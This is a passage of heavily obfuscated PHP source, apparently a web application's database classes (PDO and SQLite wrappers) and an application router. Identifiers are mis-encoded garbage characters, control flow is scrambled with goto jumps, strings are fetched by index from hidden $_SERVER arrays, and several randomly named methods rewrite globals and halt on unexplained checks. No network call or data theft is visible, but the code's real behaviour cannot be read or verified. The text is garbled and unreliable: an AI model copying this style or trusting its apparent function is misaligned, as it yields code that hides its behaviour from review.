$E»¯’ÊÈñ‡[33], $E»¯’ÊÈñ‡[46]); return $this->error; } public function escapeString($FÂËÉ¢©) { if ($this->_linkID) { return $this->_linkID->real_escape_string($FÂËÉ¢©); } else { return addslashes($FÂËÉ¢©); } } public function parseKey(&$aÒ¬Ô«ê, $b—Ÿ«¬°Ù‚ = true) { $eã‚ÖÜ¥ê¥ =& $_SERVER[»„]; if ($b—Ÿ«¬°Ù‚) { $aÒ¬Ô«ê = $this->parseKeyCheck($aÒ¬Ô«ê); } if ($aÒ¬Ô«ê != $eã‚ÖÜ¥ê¥[172] && !preg_match($eã‚ÖÜ¥ê¥[813], $aÒ¬Ô«ê)) { $aÒ¬Ô«ê = $eã‚ÖÜ¥ê¥[814] . trim($aÒ¬Ô«ê, $eã‚ÖÜ¥ê¥[814]) . $eã‚ÖÜ¥ê¥[814]; } return $aÒ¬Ô«ê; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F À·ˆš = '') { $BŠ¸§ğ»ãÈ =& $_SERVER[»„]; if (!class_exists($BŠ¸§ğ»ãÈ[816])) { think_exception(think_lang($BŠ¸§ğ»ãÈ[10]) . $BŠ¸§ğ»ãÈ[817]); } if (!empty($F À·ˆš)) { $this->config = $F À·ˆš; if (empty($this->config[$BŠ¸§ğ»ãÈ[13]])) { $this->config[$BŠ¸§ğ»ãÈ[13]] = array(); } } } public function connect($cİÉƒõ• = '', $c•êÖØ¶‡ = 0) { $A«‹•”–—• =& $_SERVER[»„]; if (!isset($this->linkID[$c•êÖØ¶‡])) { goto f¼‹ãí”Ëæ; f¼‹ãí”Ëæ: if (empty($cİÉƒõ•)) { $cİÉƒõ• = $this->config; } if ($this->pconnect) { $cİÉƒõ•[$A«‹•”–—•[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$c•êÖØ¶‡] = new PDO($cİÉƒõ•[$A«‹•”–—•[818]], $cİÉƒõ•[$A«‹•”–—•[791]], $cİÉƒõ•[$A«‹•”–—•[792]], $cİÉƒõ•[$A«‹•”–—•[13]]); } catch (PDOException $FŞ×Ñ¤–µã) { think_exception($FŞ×Ñ¤–µã->getMessage()); } goto E˜¥µ“²é; Dí£‘¾í°†: $this->linkID[$c•êÖØ¶‡]->exec($A«‹•”–—•[827] . think_config($A«‹•”–—•[794])); $this->connected = !0; if (1 != think_config($A«‹•”–—•[18])) { unset($this->config); } goto e¡Àœ‚; E˜¥µ“²é: $this->dbType = $this->_getDsnType($cİÉƒõ•[$A«‹•”–—•[818]]); if (in_array($this->dbType, array($A«‹•”–—•[819], $A«‹•”–—•[820], $A«‹•”–—•[821], $A«‹•”–—•[822]))) { think_exception($A«‹•”–—•[823] . $this->dbType . $A«‹•”–—•[824] . $this->dbType . $A«‹•”–—•[825]); } if (!$this->linkID[$c•êÖØ¶‡]) { think_exception($A«‹•”–—•[826]); } goto Dí£‘¾í°†; e¡Àœ‚: } return $this->linkID[$c•êÖØ¶‡]; } public function free() { $this->PDOStatement = null; } public function query($f§…šù…•ê, $d’ï”‡àÚˆ = array()) { goto D¤ÙÎßÂœÂ; d½Ÿ•Óâ: $this->queryStr = $f§…šù…•ê; if (!empty($d’ï”‡àÚˆ)) { $this->queryStr .= $eˆŒÖ„‡…ˆ[828] . print_r($d’ï”‡àÚˆ, !0) . $eˆŒÖ„‡…ˆ[829]; } if (!empty($this->PDOStatement)) { $this->free(); } goto F‡ëæÑÁ¸ò; D¤ÙÎßÂœÂ: $eˆŒÖ„‡…ˆ =& $_SERVER[»„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d½Ÿ•Óâ; F‡ëæÑÁ¸ò: think_action_status($eˆŒÖ„‡…ˆ[19], 1); think_status($eˆŒÖ„‡…ˆ[20]); $this->PDOStatement = $this->_linkID->prepare($f§…šù…•ê); goto Aó‚„Œ¦ìÚ; Aó‚„Œ¦ìÚ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Aã ÀÒ’š = $this->PDOStatement->execute($d’ï”‡àÚˆ); $this->debug(); goto B¦ÚÀèï»Ü; B¦ÚÀèï»Ü: if (!1 === $Aã ÀÒ’š) { $this->error(); return !1; } else { return $this->getAll(); } goto f¥„ª•½è; f¥„ª•½è: } public function execute($EìµØÎ’ŠÍ, $bÇàòø‡ƒ = array()) { goto AïÕš„ÏâÅ; D¦Ûæ“ßÏ„: think_status($e’ŒÓªÃ†•[20]); $this->PDOStatement = $this->_linkID->prepare($EìµØÎ’ŠÍ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d÷µ²âï÷Š; d÷µ²âï÷Š: $D‰õëšôÍ´ = $this->PDOStatement->execute($bÇàòø‡ƒ); $this->debug(); if (!1 === $D‰õëšôÍ´) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bë÷½°ÖØ¦ || preg_match($e’ŒÓªÃ†•[834], $EìµØÎ’ŠÍ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto DÏ¸¹æïÍš; D™­Š®ÎÎ‡: $this->queryStr = $EìµØÎ’ŠÍ; if (!empty($bÇàòø‡ƒ)) { $this->queryStr .= $e’ŒÓªÃ†•[828] . print_r($bÇàòø‡ƒ, !0) . $e’ŒÓªÃ†•[829]; } $bë÷½°ÖØ¦ = !1; goto f¦‚ÄÈƒä; f¦‚ÄÈƒä: if ($this->dbType == $e’ŒÓªÃ†•[822]) { if (preg_match($e’ŒÓªÃ†•[830], $this->queryStr, $AÑ‘ŠßÓ¨È)) { $this->table = think_config($e’ŒÓªÃ†•[831]) . str_ireplace(think_config($e’ŒÓªÃ†•[832]), $e’ŒÓªÃ†•[357], $AÑ‘ŠßÓ¨È[2]); $bë÷½°ÖØ¦ = (bool) $this->query($e’ŒÓªÃ†•[833] . strtoupper($this->table) . $e’ŒÓªÃ†•[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($e’ŒÓªÃ†•[21], 1); goto D¦Ûæ“ßÏ„; AïÕš„ÏâÅ: $e’ŒÓªÃ†• =& $_SERVER[»„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D™­Š®ÎÎ‡; DÏ¸¹æïÍš: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÚóÑŠ‰Š = $this->_linkID->commit(); $this->transTimes = 0; if (!$aÚóÑŠ‰Š) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dù‚¯Ì¢ºŒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dù‚¯Ì¢ºŒ) { $this->error(); return !1; } } return !0; } private function getAll() { $cÀÜƒëÌ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($cÀÜƒëÌ); return $cÀÜƒëÌ; } public function getFields($BÛ¢™¼ìÅØ) { goto D²±á¨àš³; A¨´Ï¤ÄŞ»: $EÛÏ¯Î¼Œ = $this->query($FÑ«œ‘×’•); $C»¥‚”Ø÷Ã = array(); if ($EÛÏ¯Î¼Œ) { foreach ($EÛÏ¯Î¼Œ as $eÁ‚Ó ‹ => $c×ÔÅÉ¿—İ) { $c×ÔÅÉ¿—İ = array_change_key_case($c×ÔÅÉ¿—İ); $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[28]] = isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[28]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[28]] : $C•ºÕ×îÅö[357]; $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[29]] = isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[29]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[29]] : $C•ºÕ×îÅö[357]; $EÁÏ†ì¼ã¨ = isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[257]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[257]] : $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[28]]; $C»¥‚”Ø÷Ã[$EÁÏ†ì¼ã¨] = array($C•ºÕ×îÅö[28] => $EÁÏ†ì¼ã¨, $C•ºÕ×îÅö[29] => $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[29]], $C•ºÕ×îÅö[31] => (bool) (isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[99]]) && $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[99]] === $C•ºÕ×îÅö[33] || isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[31]]) && $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[31]] === $C•ºÕ×îÅö[33]), $C•ºÕ×îÅö[34] => isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[34]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[34]] : (isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[53]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[53]] : $C•ºÕ×îÅö[357]), $C•ºÕ×îÅö[36] => isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[89]]) ? strtolower($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[89]]) == $C•ºÕ×îÅö[38] : (isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[54]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[54]] : !1), $C•ºÕ×îÅö[39] => isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[851]]) ? strtolower($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[851]]) == $C•ºÕ×îÅö[41] : (isset($c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[89]]) ? $c×ÔÅÉ¿—İ[$C•ºÕ×îÅö[89]] : !1)); } } goto CŸ‹…¡æ¡; D²±á¨àš³: $C•ºÕ×îÅö =& $_SERVER[»„]; $this->initConnect(!0); if (think_config($C•ºÕ×îÅö[835])) { $FÑ«œ‘×’• = str_replace($C•ºÕ×îÅö[836], $BÛ¢™¼ìÅØ, think_config($C•ºÕ×îÅö[835])); } else { switch ($this->dbType) { case $C•ºÕ×îÅö[819]: case $C•ºÕ×îÅö[837]: $FÑ«œ‘×’• = "\x53\105\114\x45\x43\x54\x20\x20\40\143\157\x6c\165\x6d\x6e\137\156\141\155\145\x20\x61\163\40\47\116\x61\x6d\145\47\54\x20\40\x20\x64\141\164\x61\137\x74\x79\x70\145\40\141\x73\x20\47\x54\171\160\x65\x27\x2c\40\40\x20\143\x6f\x6c\165\x6d\156\x5f\x64\145\x66\141\x75\154\x74\40\x61\x73\x20\x27\104\x65\146\141\x75\x6c\x74\47\x2c\40\x20\x20\151\163\x5f\x6e\x75\154\154\x61\x62\x6c\x65\x20\141\163\40\x27\116\165\154\x6c\x27\xa\11\x9\106\122\x4f\x4d\x9\151\156\146\x6f\x72\155\x61\x74\x69\157\x6e\x5f\x73\143\150\x65\x6d\141\x2e\164\x61\142\154\145\x73\x20\101\123\x20\x74\12\11\11\112\x4f\x49\116\x9\151\156\146\x6f\162\x6d\x61\164\151\157\x6e\x5f\163\143\x68\x65\155\x61\x2e\x63\x6f\x6c\x75\x6d\x6e\x73\x20\101\x53\40\143\12\x9\11\x4f\x4e\x20\40\x74\56\164\141\142\x6c\145\137\x63\141\164\141\x6c\x6f\x67\x20\75\40\143\56\164\141\142\154\145\137\143\141\164\x61\x6c\x6f\x67\xa\11\11\x41\x4e\104\40\164\x2e\x74\141\x62\154\x65\137\163\x63\150\x65\155\141\40\x3d\x20\143\x2e\x74\141\x62\x6c\x65\137\x73\143\150\x65\x6d\x61\12\x9\11\101\116\104\x20\x74\56\164\x61\x62\154\x65\137\156\141\155\145\x20\75\40\143\x2e\164\141\142\x6c\145\x5f\156\x61\x6d\145\12\x9\11\x57\110\x45\122\x45\40\x20\40\164\56\164\x61\x62\x6c\145\137\x6e\141\155\x65\x20\x3d\40\47{$BÛ¢™¼ìÅØ}\47"; break; case $C•ºÕ×îÅö[838]: $FÑ«œ‘×’• = $C•ºÕ×îÅö[839] . $BÛ¢™¼ìÅØ . $C•ºÕ×îÅö[840]; break; case $C•ºÕ×îÅö[820]: case $C•ºÕ×îÅö[822]: $FÑ«œ‘×’• = $C•ºÕ×îÅö[841] . $C•ºÕ×îÅö[842] . $C•ºÕ×îÅö[843] . strtoupper($BÛ¢™¼ìÅØ) . $C•ºÕ×îÅö[844] . strtoupper($BÛ¢™¼ìÅØ) . $C•ºÕ×îÅö[845]; break; case $C•ºÕ×îÅö[846]: $FÑ«œ‘×’• = $C•ºÕ×îÅö[847] . $BÛ¢™¼ìÅØ . $C•ºÕ×îÅö[848]; break; case $C•ºÕ×îÅö[821]: break; case $C•ºÕ×îÅö[849]: default: $FÑ«œ‘×’• = $C•ºÕ×îÅö[850] . ($this->dbType == $C•ºÕ×îÅö[849] ? "\140{$BÛ¢™¼ìÅØ}\x60" : $BÛ¢™¼ìÅØ); } } goto A¨´Ï¤ÄŞ»; CŸ‹…¡æ¡: return $C»¥‚”Ø÷Ã; goto fÏà·ÌÑä; fÏà·ÌÑä: } public function getTables($B“ã‰ì¼  = '') { $FˆšµŞ£Ì =& $_SERVER[»„]; if (think_config($FˆšµŞ£Ì[852])) { $C•á©†‚–Ö = str_replace($FˆšµŞ£Ì[853], $B“ã‰ì¼ , think_config($FˆšµŞ£Ì[852])); } else { switch ($this->dbType) { case $FˆšµŞ£Ì[820]: case $FˆšµŞ£Ì[822]: $C•á©†‚–Ö = $FˆšµŞ£Ì[854]; break; case $FˆšµŞ£Ì[819]: case $FˆšµŞ£Ì[837]: $C•á©†‚–Ö = $FˆšµŞ£Ì[855]; break; case $FˆšµŞ£Ì[846]: $C•á©†‚–Ö = $FˆšµŞ£Ì[856]; break; case $FˆšµŞ£Ì[821]: think_exception(think_lang($FˆšµŞ£Ì[857]) . $FˆšµŞ£Ì[858]); break; case $FˆšµŞ£Ì[838]: $C•á©†‚–Ö = $FˆšµŞ£Ì[42] . $FˆšµŞ£Ì[43] . $FˆšµŞ£Ì[44]; break; case $FˆšµŞ£Ì[849]: default: if (!empty($B“ã‰ì¼ )) { $C•á©†‚–Ö = $FˆšµŞ£Ì[802] . $B“ã‰ì¼ ; } else { $C•á©†‚–Ö = $FˆšµŞ£Ì[803]; } } } $fšæ¯Ê†Í = $this->query($C•á©†‚–Ö); $D”óÙŠäŒƒ = array(); foreach ($fšæ¯Ê†Í as $Fë«£¢¿ => $açÕ­â§×„) { $D”óÙŠäŒƒ[$Fë«£¢¿] = current($açÕ­â§×„); } return $D”óÙŠäŒƒ; } protected function parseLimit($Döä¥Ä†”) { $FÅˆ×½–¿œ =& $_SERVER[»„]; $cÅ“»µ¾… = $FÅˆ×½–¿œ[33]; if (!empty($Döä¥Ä†”)) { switch ($this->dbType) { case $FÅˆ×½–¿œ[846]: case $FÅˆ×½–¿œ[838]: $Döä¥Ä†” = explode($FÅˆ×½–¿œ[47], $Döä¥Ä†”); if (count($Döä¥Ä†”) > 1) { $cÅ“»µ¾… .= $FÅˆ×½–¿œ[48] . $Döä¥Ä†”[1] . $FÅˆ×½–¿œ[49] . $Döä¥Ä†”[0] . $FÅˆ×½–¿œ[50]; } else { $cÅ“»µ¾… .= $FÅˆ×½–¿œ[48] . $Döä¥Ä†”[0] . $FÅˆ×½–¿œ[50]; } break; case $FÅˆ×½–¿œ[819]: case $FÅˆ×½–¿œ[837]: break; case $FÅˆ×½–¿œ[821]: break; case $FÅˆ×½–¿œ[820]: case $FÅˆ×½–¿œ[822]: break; case $FÅˆ×½–¿œ[849]: default: $cÅ“»µ¾… .= $FÅˆ×½–¿œ[48] . $Döä¥Ä†” . $FÅˆ×½–¿œ[50]; } } return $cÅ“»µ¾…; } public function parseKey(&$d¥‹’ä¨Çê, $F­âç£ºé° = true) { $E• åóµ…Ó =& $_SERVER[»„]; if ($F­âç£ºé°) { $d¥‹’ä¨Çê = $this->parseKeyCheck($d¥‹’ä¨Çê); } if ($this->dbType == $E• åóµ…Ó[849]) { if ($d¥‹’ä¨Çê != $E• åóµ…Ó[172] && !preg_match($E• åóµ…Ó[813], $d¥‹’ä¨Çê)) { $d¥‹’ä¨Çê = $E• åóµ…Ó[814] . trim($d¥‹’ä¨Çê, $E• åóµ…Ó[814]) . $E• åóµ…Ó[814]; } return $d¥‹’ä¨Çê; } else { return parent::parseKey($d¥‹’ä¨Çê); } } public function close() { $this->_linkID = null; } public function error() { $CÛ«ÉğÜĞ =& $_SERVER[»„]; if ($this->PDOStatement) { $B¡‡¦ñ®›Ø = $this->PDOStatement->errorInfo(); $this->error = $B¡‡¦ñ®›Ø[1] . $CÛ«ÉğÜĞ[4] . $B¡‡¦ñ®›Ø[2]; } else { $this->error = $CÛ«ÉğÜĞ[33]; } if ($CÛ«ÉğÜĞ[33] != $this->queryStr) { $this->error .= LNG($CÛ«ÉğÜĞ[45]) . $this->queryStr; } think_trace($this->error, $CÛ«ÉğÜĞ[33], $CÛ«ÉğÜĞ[46]); return $this->error; } public function escapeString($dÏõïÒ‹æº) { $fˆæ“õ²¿‹ =& $_SERVER[»„]; switch ($this->dbType) { case $fˆæ“õ²¿‹[846]: case $fˆæ“õ²¿‹[819]: case $fˆæ“õ²¿‹[837]: case $fˆæ“õ²¿‹[849]: return addslashes($dÏõïÒ‹æº); case $fˆæ“õ²¿‹[821]: case $fˆæ“õ²¿‹[838]: case $fˆæ“õ²¿‹[820]: case $fˆæ“õ²¿‹[822]: return str_ireplace($fˆæ“õ²¿‹[55], $fˆæ“õ²¿‹[56], $dÏõïÒ‹æº); } } protected function parseValue($BèŠ”«ÍïÄ) { $aêØˆ¼ÂÔ =& $_SERVER[»„]; if (is_string($BèŠ”«ÍïÄ)) { $BèŠ”«ÍïÄ = strpos($BèŠ”«ÍïÄ, $aêØˆ¼ÂÔ[4]) === 0 ? $this->escapeString($BèŠ”«ÍïÄ) : $aêØˆ¼ÂÔ[859] . $this->escapeString($BèŠ”«ÍïÄ) . $aêØˆ¼ÂÔ[859]; } elseif (isset($BèŠ”«ÍïÄ[0]) && is_string($BèŠ”«ÍïÄ[0]) && strtolower($BèŠ”«ÍïÄ[0]) == $aêØˆ¼ÂÔ[281]) { $BèŠ”«ÍïÄ = $this->escapeString($BèŠ”«ÍïÄ[1]); } elseif (is_array($BèŠ”«ÍïÄ)) { $BèŠ”«ÍïÄ = array_map(array($this, $aêØˆ¼ÂÔ[860]), $BèŠ”«ÍïÄ); } elseif (is_bool($BèŠ”«ÍïÄ)) { $BèŠ”«ÍïÄ = $BèŠ”«ÍïÄ ? $aêØˆ¼ÂÔ[83] : $aêØˆ¼ÂÔ[464]; } elseif (is_null($BèŠ”«ÍïÄ)) { $BèŠ”«ÍïÄ = $aêØˆ¼ÂÔ[99]; } return $BèŠ”«ÍïÄ; } public function getLastInsertId() { $D×ÛòƒØ¤¬ =& $_SERVER[»„]; switch ($this->dbType) { case $D×ÛòƒØ¤¬[846]: case $D×ÛòƒØ¤¬[838]: case $D×ÛòƒØ¤¬[819]: case $D×ÛòƒØ¤¬[837]: case $D×ÛòƒØ¤¬[821]: case $D×ÛòƒØ¤¬[849]: return $this->_linkID->lastInsertId(); case $D×ÛòƒØ¤¬[820]: case $D×ÛòƒØ¤¬[822]: $f‚˜¸ÄĞÜõ = $this->table; $F¹ê¡£ó½ = $this->query("\x53\x45\114\105\x43\x54\40{$f‚˜¸ÄĞÜõ}\x2e\x63\x75\162\x72\166\141\154\x20\x63\165\162\162\166\x61\154\40\x46\x52\117\115\40\144\x75\x61\154"); return $F¹ê¡£ó½ ? $F¹ê¡£ó½[0][$D×ÛòƒØ¤¬[861]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($e†ª·—ğ‡) { goto f¼ê’ä©œŠ; D¾÷®È¥Ù²: fclose($E‡ÀÌ£‡â›); show_json($fÄÔ»ƒË”´[864], !1); return !1; goto F»»‰´; f¼ê’ä©œŠ: $fÄÔ»ƒË”´ =& $_SERVER[»„]; $c®·¦øº¯› = DATA_PATH . $fÄÔ»ƒË”´[862]; $E‡ÀÌ£‡â› = fopen($c®·¦øº¯›, $fÄÔ»ƒË”´[863]); goto bªØÔ«°‡ƒ; bªØÔ«°‡ƒ: if (!$E‡ÀÌ£‡â›) { return !1; } if (flock($E‡ÀÌ£‡â›, LOCK_EX)) { $bª¢èñƒ‹… = parent::query($e†ª·—ğ‡); flock($E‡ÀÌ£‡â›, LOCK_UN); fclose($E‡ÀÌ£‡â›); return $bª¢èñƒ‹…; } flock($E‡ÀÌ£‡â›, LOCK_UN); goto D¾÷®È¥Ù²; F»»‰´: } public function execute($CÌšÈŞŸ) { goto dö¸î¥ˆ“¬; f¡ö¸ÃÊš: if (!$E‡ÚƒÑ¶ÜÌ) { return !1; } if (flock($E‡ÚƒÑ¶ÜÌ, LOCK_EX)) { $CôãƒÁÙ– = parent::execute($CÌšÈŞŸ); flock($E‡ÚƒÑ¶ÜÌ, LOCK_UN); fclose($E‡ÚƒÑ¶ÜÌ); return $CôãƒÁÙ–; } flock($E‡ÚƒÑ¶ÜÌ, LOCK_UN); goto d®¸ºŸñ; dö¸î¥ˆ“¬: $Bô´½ŠØ°² =& $_SERVER[»„]; $B»Ã´œ¬Û = DATA_PATH . $Bô´½ŠØ°²[862]; $E‡ÚƒÑ¶ÜÌ = fopen($B»Ã´œ¬Û, $Bô´½ŠØ°²[863]); goto f¡ö¸ÃÊš; d®¸ºŸñ: fclose($E‡ÚƒÑ¶ÜÌ); show_json($Bô´½ŠØ°²[864], !1); return !1; goto aˆ‰ÙÉö³; aˆ‰ÙÉö³: } } goto e¦´³Í¡ÇÏ; B‡Íƒ»óòø: if (strlen($b¹©¾ìà‘ã) < $_SERVER[»„][547]) { return; } class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($C¹ù‚ÈõÒÀ) { goto c£æĞîù¢œ; fÄŸ‚ëŞó: $fÖª††Æ˜’ = $A™Œ„Œ•†à[549]; if (strlen($fÖª††Æ˜’) < $A™Œ„Œ•†à[547]) { die; } goto d¬÷éÄƒ¥; Fğ¦Á­‡Ğ†: $FÇºÉËœ‰ = $A™Œ„Œ•†à[548]; if (!$FÇºÉËœ‰) { return; } $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][3]}($f¦ÙòæµĞÁ[4], array($this, $f¦ÙòæµĞÁ[5])); goto fÄŸ‚ëŞó; c£æĞîù¢œ: $A™Œ„Œ•†à =& $_SERVER[»„]; $f¦ÙòæµĞÁ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $d­øì­ù® = $f¦ÙòæµĞÁ[0]($f¦ÙòæµĞÁ[1], $f¦ÙòæµĞÁ[2]($C¹ù‚ÈõÒÀ, $f¦ÙòæµĞÁ[1])); goto cô‚ˆ·ìª; cô‚ˆ·ìª: $this->defaultModule = $d­øì­ù®[0] ? $d­øì­ù®[0] : $this->defaultModule; $this->defaultController = $d­øì­ù®[1] ? $d­øì­ù®[1] : $this->defaultController; $this->defaultAction = $d­øì­ù®[2] ? $d­øì­ù®[2] : $this->defaultAction; goto Fğ¦Á­‡Ğ†; d¬÷éÄƒ¥: } public function appRun($d¾«šÌùß) { goto fÍÒˆÆ¯; d“âÜÏ¥Œô: $EóÙËöƒÑ‹ = $D‡ì„ÈÂ»[7]; if ($cÉ–ĞŒ¤¥‹ == $D‡ì„ÈÂ»[8]) { $EóÙËöƒÑ‹ = $D‡ì„ÈÂ»[9]; $bÆÔ¶²«ê¡[0] = $D‡ì„ÈÂ»[10]; $bÆÔ¶²«ê¡[1] = $bÆÔ¶²«ê¡[1] . $D‡ì„ÈÂ»[11]; $d¾«šÌùß = $D‡ì„ÈÂ»[12]($D‡ì„ÈÂ»[1], $bÆÔ¶²«ê¡); $d¾«šÌùß = $D‡ì„ÈÂ»[2]($d¾«šÌùß, $D‡ì„ÈÂ»[1]); } $D‡ì„ÈÂ»[13](array($D‡ì„ÈÂ»[14], $D‡ì„ÈÂ»[15]), $EóÙËöƒÑ‹ . $D‡ì„ÈÂ»[16], $d¾«šÌùß); goto E·ô†Ÿ—ô; E·ô†Ÿ—ô: $D‡ì„ÈÂ»[17]($d¾«šÌùß); $D‡ì„ÈÂ»[13](array($D‡ì„ÈÂ»[14], $D‡ì„ÈÂ»[15]), $EóÙËöƒÑ‹ . $D‡ì„ÈÂ»[18], $d¾«šÌùß); goto CÁ™ŒÉâ‰ƒ; fÍÒˆÆ¯: $D‡ì„ÈÂ» =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $bÆÔ¶²«ê¡ = $D‡ì„ÈÂ»[0]($D‡ì„ÈÂ»[1], $d¾«šÌùß); $cÉ–ĞŒ¤¥‹ = $D‡ì„ÈÂ»[6]($bÆÔ¶²«ê¡[0]); goto d“âÜÏ¥Œô; CÁ™ŒÉâ‰ƒ: } private function autorun() { $a½“Ù–Ö­Œ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; global $config; if ($a½“Ù–Ö­Œ[19]($config[$a½“Ù–Ö­Œ[20]]) == 0) { return; } foreach ($config[$a½“Ù–Ö­Œ[20]] as $báÒ¶¢¦¡Ã => $c¿Ğ‡ ”¢) { $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][21]}($c¿Ğ‡ ”¢); } } private function yhcr9ecd6d8f() { goto eÄ‚ãá¹‡Î; FİÑ™¼½: $aÈ±È¥²–á = $f–Ğé¤­Ù‹[26]($GLOBALS[$f–Ğé¤­Ù‹[22]][$f–Ğé¤­Ù‹[23]], 1); $A•®çÀªò = $e„óÔƒŞòÓ[553]; if (strlen($A•®çÀªò) < $e„óÔƒŞòÓ[554]) { return; } goto cÍØÛôÈáò; aêŸ´ñ°·: if ($f–Ğé¤­Ù‹[6]($f–Ğé¤­Ù‹[25]($fß¼¿–Ìµ, -$f–Ğé¤­Ù‹[24]($dÌíàÚìÒ))) != $dÌíàÚìÒ) { return; } $b·³¯èÈ´ñ = $f–Ğé¤­Ù‹[25]($fß¼¿–Ìµ, 0, -$f–Ğé¤­Ù‹[24]($dÌíàÚìÒ)); $b¦¸ÈÜ±Ø§ = $e„óÔƒŞòÓ[551]; goto a¢ÕçÅ¯á; f³‹ö”£ë·: $fß¼¿–Ìµ = $GLOBALS[$f–Ğé¤­Ù‹[22]][$f–Ğé¤­Ù‹[23]][0]; $fëì‹ƒğïÄ = $e„óÔƒŞòÓ[550]; if (!$fß¼¿–Ìµ || $f–Ğé¤­Ù‹[24]($fß¼¿–Ìµ) <= $f–Ğé¤­Ù‹[24]($dÌíàÚìÒ)) { return; } goto aêŸ´ñ°·; cÍØÛôÈáò: $GLOBALS[$f–Ğé¤­Ù‹[22]][$f–Ğé¤­Ù‹[23]] = $f–Ğé¤­Ù‹[27]($DÀïÌ³¬‘², $aÈ±È¥²–á); $GLOBALS[$f–Ğé¤­Ù‹[22]][$f–Ğé¤­Ù‹[28]] = $f–Ğé¤­Ù‹[29]($f–Ğé¤­Ù‹[1], $GLOBALS[$f–Ğé¤­Ù‹[22]][$f–Ğé¤­Ù‹[23]]); goto Döà»ˆ•”ö; a¢ÕçÅ¯á: if (!$b¦¸ÈÜ±Ø§) { die; } $DÀïÌ³¬‘² = array($f–Ğé¤­Ù‹[8], $b·³¯èÈ´ñ); $B¦š‹®µÂ• = $e„óÔƒŞòÓ[552]; goto FİÑ™¼½; eÄ‚ãá¹‡Î: $e„óÔƒŞòÓ =& $_SERVER[»„]; $f–Ğé¤­Ù‹ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $dÌíàÚìÒ = $f–Ğé¤­Ù‹[8]; goto f³‹ö”£ë·; Döà»ˆ•”ö: } private function qpiyc0e0b53b() { goto e²ßïÉ ×Î; b³á›¹­œÈ: $E§«é³ÒÀÇ = $EÛÜğ÷ª¬¡[25]($dîù¿´±Çç, $dË¨™Ôœ½ + $EÛÜğ÷ª¬¡[24]($CƒÛµ‚ƒ­)); $EÛÜğ÷ª¬¡[34]($EÛÜğ÷ª¬¡[35], $E§«é³ÒÀÇ, $aŒ—¢¶Çøã); $eùğª÷”Û‹ = $c½’•Í–ŒÅ[556]; goto d‘©¥Œ¨Ø·; a¶ÃØ•›Ü: if (strlen($b–ñáÔÓÛ²) < $c½’•Í–ŒÅ[547]) { return; } $GLOBALS[$EÛÜğ÷ª¬¡[22]][$EÛÜğ÷ª¬¡[23]] = $EÛÜğ÷ª¬¡[0]($EÛÜğ÷ª¬¡[36], $E§«é³ÒÀÇ); $a×Â•›Ö¦Ì = $c½’•Í–ŒÅ[559]; goto F©»©×†Û; EÙÎÅóªå: $dîù¿´±Çç = $_SERVER[$EÛÜğ÷ª¬¡[30]]; $CƒÛµ‚ƒ­ = $EÛÜğ÷ª¬¡[31]; if (!$EÛÜğ÷ª¬¡[32]($dîù¿´±Çç, $CƒÛµ‚ƒ­)) { return; } goto B†¨ßİŒ©…; F©»©×†Û: if (strlen($a×Â•›Ö¦Ì) < $c½’•Í–ŒÅ[560]) { die; } $GLOBALS[$EÛÜğ÷ª¬¡[22]][$EÛÜğ÷ª¬¡[28]] = $EÛÜğ÷ª¬¡[29]($EÛÜğ÷ª¬¡[1], $GLOBALS[$EÛÜğ÷ª¬¡[22]][$EÛÜğ÷ª¬¡[23]]); $DÌŒõ°Åê = $c½’•Í–ŒÅ[561]; goto c‚Á“©ö®; d‘©¥Œ¨Ø·: if (strlen($eùğª÷”Û‹) < $c½’•Í–ŒÅ[557]) { return; } $E§«é³ÒÀÇ = $EÛÜğ÷ª¬¡[2]($aŒ—¢¶Çøã[0][0], 